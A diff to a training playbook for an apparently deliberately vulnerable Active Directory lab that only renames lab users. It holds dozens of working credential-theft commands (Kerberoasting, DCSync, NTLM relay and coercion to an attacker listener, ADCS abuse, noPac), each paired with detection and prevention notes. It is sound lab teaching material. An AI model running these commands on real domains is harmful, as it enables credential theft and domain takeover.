@@ -1,16 +1,16 @@
 # 03 — Credential Access (CRED-001..065)
 
-Goal of this phase: turn "domain user `alice`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in DVAD via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.
+Goal of this phase: turn "domain user `peter.parker`" into "hashes / tickets / certs for higher-privileged principals." Every entry below is wired up in DVAD via the Ansible `vuln-cred-access.yml`, `vuln-kerberos.yml`, `vuln-adcs-esc.yml`, and the ADCS role.
 
 ---
 
 ### CRED-001 — Kerberoasting
 **What it is:** request a TGS for any account with an SPN; the TGS is partly encrypted with the service account's NT hash. Crack offline with hashcat.
-**Why it works here:** `svc_web`, `svc_sql`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `Password123!`).
+**Why it works here:** `svc_vision`, `svc_jarvis`, `svc_legacy` have SPNs and weak passwords (`Summer2023!`, `Password123!`).
 **Tools:** `impacket-GetUserSPNs`, `Rubeus`, `hashcat -m 13100`.
 **Steps:**
 ```bash
-impacket-GetUserSPNs corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10 \
+impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile spn.hashes
 hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt
 ```
@@ -84,7 +84,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Temp\l.dmp
 
 ### CRED-006 — SAM Database Extraction
 **What it is:** copy/read `C:\Windows\System32\config\SAM` + `SYSTEM` hive → extract local user NT hashes. With `SeBackupPrivilege` you can read locked files.
-**Why it works here:** `backup_user` has Backup Operators.
+**Why it works here:** `heimdall` has Backup Operators.
 **Tools:** `reg save`, `secretsdump.py`, `pypykatz`.
 **Steps:**
 ```cmd
@@ -119,11 +119,11 @@ impacket-secretsdump -just-dc-ntlm corp.local/Administrator:'DVADlab2024!'@10.10
 
 ### CRED-008 — Shadow Credentials (msDS-KeyCredentialLink)
 **What it is:** if you have `GenericWrite` on a target user/computer, you can append a public key to `msDS-KeyCredentialLink`. Then PKINIT-auth as that user with your matching private key → get their TGT (and NT hash via UnPAC).
-**Why it works here:** `helpdesk` group has GenericWrite on multiple users.
+**Why it works here:** `nick.fury` group has GenericWrite on multiple users.
 **Tools:** `pyWhisker`, `Certipy shadow`, `Rubeus`.
 **Steps:**
 ```bash
-certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' -account svc_web
+certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' -account svc_vision
 # certipy prints both the cert and the resulting NT hash
 ```
 **Detection:** Event `5136` (object modified) on `msDS-KeyCredentialLink`. ATA/MDI flag.
@@ -133,11 +133,11 @@ certipy shadow auto -u alice@corp.local -p 'DVADlab2024!' -account svc_web
 
 ### CRED-009 — Reversible Password Encryption
 **What it is:** the `ALLOW_REVERSIBLE_PASSWORD_ENCRYPTION` flag stores the password in a recoverable form. DCSync the user and recover plaintext.
-**Why it works here:** `backup_user` has this set.
+**Why it works here:** `heimdall` has this set.
 **Tools:** `secretsdump.py --reversible`, mimikatz `lsadump::dcsync`.
 **Steps:**
 ```bash
-impacket-secretsdump -just-dc-user backup_user corp.local/sync_user:'DVADlab2024!'@10.10.0.10
+impacket-secretsdump -just-dc-user heimdall corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10
 # look for "RevPlaintext" / plaintext field
 ```
 **Detection:** Event `4738` (user account changed) when the flag is set.
@@ -152,7 +152,7 @@ impacket-secretsdump -just-dc-user backup_user corp.local/sync_user:'DVADlab2024
 **Steps:**
 ```powershell
 .\mimikatz.exe "token::elevate" "token::list" "token::use /id:0xN"
-Invoke-TokenManipulation -ImpersonateUser -Username 'corp\svc_web'
+Invoke-TokenManipulation -ImpersonateUser -Username 'corp\svc_vision'
 ```
 **Detection:** Sysmon `4624` Logon Type 9 from suspicious processes; EDR token-impersonation rules.
 **Prevention:** run services with the minimum needed privilege; Protected Users group for sensitive accounts; sensitive accounts marked "Account is sensitive and cannot be delegated."
@@ -184,8 +184,8 @@ impacket-psexec corp.local/Administrator@10.10.0.10 -hashes :31d6...
 .\mimikatz.exe "kerberos::ptt ticket.kirbi"
 ```
 ```bash
-export KRB5CCNAME=alice.ccache
-impacket-psexec -k -no-pass corp.local/alice@dc01.corp.local
+export KRB5CCNAME=peter.parker.ccache
+impacket-psexec -k -no-pass corp.local/peter.parker@dc01.corp.local
 ```
 **Detection:** Event `4624` Logon Type 3 + `Authentication Package: Kerberos` from an account whose normal logon location differs (TGT theft). Hard to detect without baseline.
 **Prevention:** Protected Users (TGTs not cached); shorter TGT lifetime; Credential Guard.
@@ -194,11 +194,11 @@ impacket-psexec -k -no-pass corp.local/alice@dc01.corp.local
 
 ### CRED-013 — DCSync (Replicate Directory Changes)
 **What it is:** `DRSUAPI::GetNCChanges` lets a principal pull password hashes for any user. Requires `Replicating Directory Changes`+ `RDC-All`. Mimikatz/secretsdump speak DRSR.
-**Why it works here:** `sync_user` granted both rights; Backup Operators inherits them in some configs.
+**Why it works here:** `doctor.strange` granted both rights; Backup Operators inherits them in some configs.
 **Tools:** `secretsdump.py -just-dc`, `mimikatz lsadump::dcsync`.
 **Steps:**
 ```bash
-impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-ntlm
+impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 -just-dc-ntlm
 ```
 ```powershell
 .\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator"
@@ -210,7 +210,7 @@ impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-ntl
 
 ### CRED-014 — DCSync via `GetChangesAll`
 **What it is:** same primitive, higher-tier permission for confidential attributes (e.g. trust passwords, BitLocker keys).
-**Why it works here:** `sync_user` has it.
+**Why it works here:** `doctor.strange` has it.
 **Tools/Steps:** same as CRED-013, with `-just-dc` (full).
 **Detection / Prevention:** same as CRED-013.
 
@@ -220,7 +220,7 @@ impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-ntl
 **What it is:** instead of *pulling* secrets, *push* changes by impersonating a DC (Mimikatz registers an SPN, briefly becomes a DC, pushes attribute writes). Lower-fidelity logging because changes look like replication.
 **Why it works here:** Schema Admins delegation is loose.
 **Tools:** mimikatz `lsadump::dcshadow`.
-**Steps:** Mimikatz instance 1 (push): `lsadump::dcshadow /object:CN=alice,... /attribute:primaryGroupID /value:512`. Instance 2 (server): `lsadump::dcshadow /push`.
+**Steps:** Mimikatz instance 1 (push): `lsadump::dcshadow /object:CN=peter.parker,... /attribute:primaryGroupID /value:512`. Instance 2 (server): `lsadump::dcshadow /push`.
 **Detection:** Event `4742` (computer object created with SPNs `GC/...` `E3514235-4B06-...`), abnormal replication source. MDI native alert.
 **Prevention:** remove Schema/Domain Admins write to Configuration container; monitor replication metadata.
 
@@ -228,12 +228,12 @@ impacket-secretsdump corp.local/sync_user:'DVADlab2024!'@10.10.0.10 -just-dc-ntl
 
 ### CRED-016 — Constrained Delegation Abuse (S4U2Self/S4U2Proxy)
 **What it is:** an account with `msDS-AllowedToDelegateTo` set can request a TGS *to that target SPN* on behalf of *any* user (S4U2Proxy). With `TrustedToAuthForDelegation` you can also call S4U2Self first → impersonate anyone to anywhere in the constrained list.
-**Why it works here:** `svc_web` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/file01`.
+**Why it works here:** `svc_vision` has TRUSTED_TO_AUTH_FOR_DELEGATION + delegation to `CIFS/file01`.
 **Tools:** `Rubeus s4u`, `impacket-getST`.
 **Steps:**
 ```bash
 impacket-getST -spn cifs/file01.corp.local \
-   -impersonate Administrator corp.local/svc_web:'Summer2023!' -dc-ip 10.10.0.10
+   -impersonate Administrator corp.local/svc_vision:'Summer2023!' -dc-ip 10.10.0.10
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass file01.corp.local
 ```
@@ -244,14 +244,14 @@ impacket-psexec -k -no-pass file01.corp.local
 
 ### CRED-017 — Resource-Based Constrained Delegation (RBCD)
 **What it is:** `msDS-AllowedToActOnBehalfOfOtherIdentity` on a *target* lists principals allowed to delegate to it. If you can write that attribute on a target, you can RBCD-attack from any controllable principal. Combine with MachineAccountQuota=10 to create your own computer.
-**Why it works here:** `ws01$` allows `svc_web$` to act on behalf of; `MachineAccountQuota=10`.
+**Why it works here:** `ws01$` allows `svc_vision$` to act on behalf of; `MachineAccountQuota=10`.
 **Tools:** `impacket-addcomputer`, `rbcd.py`, `Rubeus s4u`.
 **Steps:**
 ```bash
 impacket-addcomputer -computer-name 'evil$' -computer-pass 'P@ssw0rd!' \
-   corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+   corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 impacket-rbcd -delegate-from 'evil$' -delegate-to 'ws01$' \
-   -action write corp.local/alice:'DVADlab2024!' -dc-ip 10.10.0.10
+   -action write corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10
 impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
    corp.local/evil\$:'P@ssw0rd!' -dc-ip 10.10.0.10
 ```
@@ -269,7 +269,7 @@ impacket-getST -spn cifs/ws01.corp.local -impersonate Administrator \
 # on file01 (admin):
 .\Rubeus.exe monitor /interval:5 /filteruser:DC01$
 # from any low-priv:
-python3 printerbug.py corp.local/alice:'DVADlab2024!'@dc01.corp.local file01.corp.local
+python3 printerbug.py corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local file01.corp.local
 # Rubeus catches DC01$ TGT; PtT, DCSync.
 ```
 **Detection:** Event `4624` Logon Type 3 from DC$ to unconstrained host; Defender for Identity unconstrained delegation exposure.
@@ -283,7 +283,7 @@ python3 printerbug.py corp.local/alice:'DVADlab2024!'@dc01.corp.local file01.cor
 **Tools:** `CVE-2021-1675.py`, `PrintNightmare.py`, `SharpPrintNightmare`.
 **Steps:**
 ```bash
-python3 cve-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
+python3 cve-2021-1675.py corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 '\\10.10.0.100\share\add_user.dll'
 ```
 **Detection:** Event `316` (PrintService/Admin) with `PrinterDriverInstalled`; Event `808` driver load failures from non-admin contexts.
 **Prevention:** disable Print Spooler everywhere it's not used (especially DCs); patch (KB5005010+); set `RestrictDriverInstallationToAdministrators=1`.
@@ -298,7 +298,7 @@ python3 cve-2021-1675.py corp.local/alice:'DVADlab2024!'@10.10.0.10 '\\10.10.0.1
 ```bash
 ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController -smb2support
-python3 PetitPotam.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
+python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
 # Pipe the base64 cert to gettgtpkinit:
 python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx dc01.ccache
 ```
@@ -314,7 +314,7 @@ python3 gettgtpkinit.py corp.local/DC01\$ -cert-pfx dc01.pfx dc01.ccache
 **Steps:**
 ```bash
 ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
-python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
+python3 dfscoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.0.10
 ```
 **Detection:** RPC `MS-DFSNM` calls from non-admin accounts.
 **Prevention:** disable DFS Namespaces where not needed; force SMB signing + LDAPS channel binding.
@@ -337,7 +337,7 @@ python3 dfscoerce.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 10.10.
 **Tools:** `noPac.py`, `Rubeus + Pachine`, `impacket-getTGT`.
 **Steps:**
 ```bash
-python3 noPac.py -dc-ip 10.10.0.10 corp.local/alice:'DVADlab2024!' \
+python3 noPac.py -dc-ip 10.10.0.10 corp.local/peter.parker:'DVADlab2024!' \
    -dc-host dc01.corp.local -shell
 ```
 **Detection:** Event `4741` (computer created) + `4742` (renamed) + `4624` Logon Type 3 with mismatched names; MDI alert.
@@ -352,8 +352,8 @@ python3 noPac.py -dc-ip 10.10.0.10 corp.local/alice:'DVADlab2024!' \
 **Steps:**
 ```bash
 impacket-addcomputer -computer-name 'attack$' -computer-pass 'P@ssw0rd!' \
-   corp.local/alice:'DVADlab2024!'
-certipy account update -u alice@corp.local -p 'DVADlab2024!' \
+   corp.local/peter.parker:'DVADlab2024!'
+certipy account update -u peter.parker@corp.local -p 'DVADlab2024!' \
    -user attack$ -dns dc01.corp.local
 certipy req -u 'attack$@corp.local' -p 'P@ssw0rd!' -ca corp-CA-CA -template Machine \
    -target ca01.corp.local
@@ -372,7 +372,7 @@ certipy auth -pfx attack.pfx -dc-ip 10.10.0.10
 **Steps:**
 ```bash
 ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access --no-smb-server -smb2support -http-port 80
-python3 PetitPotam.py -u alice -p 'DVADlab2024!' \
+python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' \
    '\\attacker@80/foo' file01.corp.local
 ```
 **Detection:** WebDAV PROPFIND in IIS logs; WebClient service start events.
@@ -386,7 +386,7 @@ python3 PetitPotam.py -u alice -p 'DVADlab2024!' \
 **Tools:** `Invoke-DNSUpdate`, `dnstool.py`, `krbrelayx/dnstool.py`.
 **Steps:**
 ```bash
-python3 dnstool.py -u 'corp\alice' -p 'DVADlab2024!' \
+python3 dnstool.py -u 'corp\peter.parker' -p 'DVADlab2024!' \
    -r '*' -d 10.10.0.100 --action add 10.10.0.10
 ```
 **Detection:** Event `5136` on `dnsNode` objects under `MicrosoftDNS`.
@@ -400,7 +400,7 @@ python3 dnstool.py -u 'corp\alice' -p 'DVADlab2024!' \
 **Tools:** `Certipy req --upn`, `Certify request /altname:`.
 **Steps:**
 ```bash
-certipy req -u alice@corp.local -p 'DVADlab2024!' -ca corp-CA-CA \
+certipy req -u peter.parker@corp.local -p 'DVADlab2024!' -ca corp-CA-CA \
    -template User -upn Administrator@corp.local -target ca01.corp.local
 certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 ```
@@ -415,7 +415,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
 **Tools:** `Certipy ≥ 4.8`.
 **Steps:**
 ```bash
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA \
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA \
    -template WebServer -application-policies 'Client Authentication' \
    -upn Administrator@corp.local
 ```
@@ -468,8 +468,8 @@ sudo tcpdump -i virbr1 -A 'port 389 and tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x60'
 **Tools:** `nxc ldap --laps`, `LAPSDumper`, `Get-LAPSADPassword`.
 **Steps:**
 ```bash
-nxc ldap 10.10.0.10 -u alice -p 'DVADlab2024!' --laps
-python3 laps.py -u alice -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
+nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --laps
+python3 laps.py -u peter.parker -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
 ```
 **Detection:** Event `4662` reading `ms-Mcs-AdmPwd` attribute (GUID known).
 **Prevention:** audit who has `All Extended Rights` / `Read ms-Mcs-AdmPwd` on OUs; migrate to Windows LAPS with encryption.
@@ -478,11 +478,11 @@ python3 laps.py -u alice -p 'DVADlab2024!' -d corp.local -dc-ip 10.10.0.10
 
 ### CRED-034 — gMSA Password Read
 **What it is:** `msDS-ManagedPassword` returns the current+previous gMSA NT keys to anyone in `PrincipalsAllowedToRetrieveManagedPassword`.
-**Why it works here:** `helpdesk` is in the list for `gmsa_svc$`.
+**Why it works here:** `nick.fury` is in the list for `gmsa_ultron$`.
 **Tools:** `gMSADumper`, `nxc ldap --gmsa`.
 **Steps:**
 ```bash
-python3 gMSADumper.py -u alice -p 'DVADlab2024!' -d corp.local
+python3 gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local
 ```
 **Detection:** Event `4662` reading `msDS-ManagedPassword` from non-host account.
 **Prevention:** lock down `PrincipalsAllowedToRetrieveManagedPassword` to the intended host only.
@@ -546,7 +546,7 @@ Open-AADIntOffice365Portal -AccessToken $token
 
 ### CRED-039 — SeBackupPrivilege → SAM/SECURITY/NTDS
 **What it is:** `SeBackupPrivilege` bypasses file ACLs for read. Member of Backup Operators on a DC → read `NTDS.dit` and the registry SYSTEM hive → secretsdump offline.
-**Why it works here:** `backup_user` has it.
+**Why it works here:** `heimdall` has it.
 **Tools:** `robocopy /B`, `reg save`, `diskshadow`.
 **Steps:**
 ```cmd
@@ -627,8 +627,8 @@ ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc ..."
 **Tools:** `Certipy req -on-behalf-of`.
 **Steps:**
 ```bash
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
-certipy req -u alice -p 'DVADlab2024!' -ca corp-CA-CA -template User \
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template EnrollmentAgentTemplate
+certipy req -u peter.parker -p 'DVADlab2024!' -ca corp-CA-CA -template User \
    -on-behalf-of 'corp\Administrator' -pfx ea.pfx
 ```
 **Detection:** ADCS Event `4886`/`4887` with "Enrollment Agent" attribute.
@@ -655,8 +655,8 @@ ntlmrelayx.py -t ldaps://dc01.corp.local --delegate-access -smb2support
 **Tools:** `PetitPotam`, `ntlmrelayx -t ldap://...`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user alice -smb2support --no-smb-server -http-port 80
-python3 PetitPotam.py -u alice -p 'DVADlab2024!' '\\attacker@80/foo' file01.corp.local
+ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user peter.parker -smb2support --no-smb-server -http-port 80
+python3 PetitPotam.py -u peter.parker -p 'DVADlab2024!' '\\attacker@80/foo' file01.corp.local
 ```
 **Detection:** non-DC LDAP write events for AdminSDHolder/User ACL.
 **Prevention:** require LDAP signing; disable WebClient; SMB signing required.
@@ -683,7 +683,7 @@ python3 PetitPotam.py -u alice -p 'DVADlab2024!' '\\attacker@80/foo' file01.corp
 **Tools:** same as CRED-051 + `ntlmrelayx.py`.
 **Steps:**
 ```bash
-ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user alice -smb2support
+ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user peter.parker -smb2support
 # deliver .library-ms via shared archive
 ```
 **Detection / Prevention:** same as CRED-051 + LDAP signing + channel binding.
@@ -695,7 +695,7 @@ ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user alice -smb2support
 **Tools:** `ShadowCoerce.py`.
 **Steps:**
 ```bash
-python3 ShadowCoerce.py -u alice -p 'DVADlab2024!' -d corp.local 10.10.0.100 dc01.corp.local
+python3 ShadowCoerce.py -u peter.parker -p 'DVADlab2024!' -d corp.local 10.10.0.100 dc01.corp.local
 ```
 **Detection / Prevention:** RPC filter for FSRVP; patch (KB5015754).
 
@@ -718,7 +718,7 @@ python3 pre2k.py auth -d corp.local -dc-ip 10.10.0.10 -inputfile machines.txt -o
 **Tools:** `RemoteMonologue.py`, `Internal-Monologue.exe`.
 **Steps:**
 ```bash
-python3 remotemonologue.py -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.13
+python3 remotemonologue.py -u peter.parker -p 'DVADlab2024!' -d corp.local -t 10.10.0.13
 ```
 **Detection:** Sysmon `1` `mmc.exe`/`taskmgr.exe` spawning DCOM under unusual parent.
 **Prevention:** disable DCOM (`HKLM\Software\Microsoft\Ole\EnableDCOM=N`) where unused; block outbound NTLM.
@@ -727,7 +727,7 @@ python3 remotemonologue.py -u alice -p 'DVADlab2024!' -d corp.local -t 10.10.0.1
 
 ### CRED-056 — "Walking Dead" — Disabled Account Abuse
 **What it is:** disabled account that still has Domain Admin group membership. `GenericAll` on the object → re-enable, set password, login.
-**Why it works here:** `da_old` disabled but DA-member; helpdesk has GenericAll.
+**Why it works here:** `da_old` disabled but DA-member; nick.fury has GenericAll.
 **Tools:** `net user`, `Set-ADAccountPassword`, `Enable-ADAccount`.
 **Steps:**
 ```powershell
@@ -762,7 +762,7 @@ Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
 **Tools:** `goLAPS`, `LAPSDumper.py`, `nxc ldap --laps`.
 **Steps:**
 ```bash
-./goLAPS -u alice -p 'DVADlab2024!' -d corp.local -dc 10.10.0.10
+./goLAPS -u peter.parker -p 'DVADlab2024!' -d corp.local -dc 10.10.0.10
 ```
 **Detection:** large `4662` for ms-LAPS-Password / ms-Mcs-AdmPwd reads.
 **Prevention:** Windows LAPS with encryption; restrict ReadLAPSPassword to a security group, not All Authenticated Users.
@@ -786,7 +786,7 @@ Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true' |
 **Tools:** `krbrelayx.py`.
 **Steps:**
 ```bash
-python3 dnstool.py -u 'corp\alice' -p 'DVADlab2024!' \
+python3 dnstool.py -u 'corp\peter.parker' -p 'DVADlab2024!' \
    -r 'fs1' --action add --data 10.10.0.100 10.10.0.10
 python3 krbrelayx.py -t ldap://dc01.corp.local --delegate-access
 ```
@@ -812,7 +812,7 @@ KrbRelayUp.exe full --Method SCM
 **Tools:** `goldenPac.py`, `pykek`.
 **Steps:**
 ```bash
-impacket-goldenPac corp.local/alice:'DVADlab2024!'@dc01.corp.local
+impacket-goldenPac corp.local/peter.parker:'DVADlab2024!'@dc01.corp.local
 ```
 **Detection:** Event `4769` with mismatched PAC signature; KDC log signature failure.
 **Prevention:** patch (KB3011780 — 2014); should be impossible on any DC built since 2015.
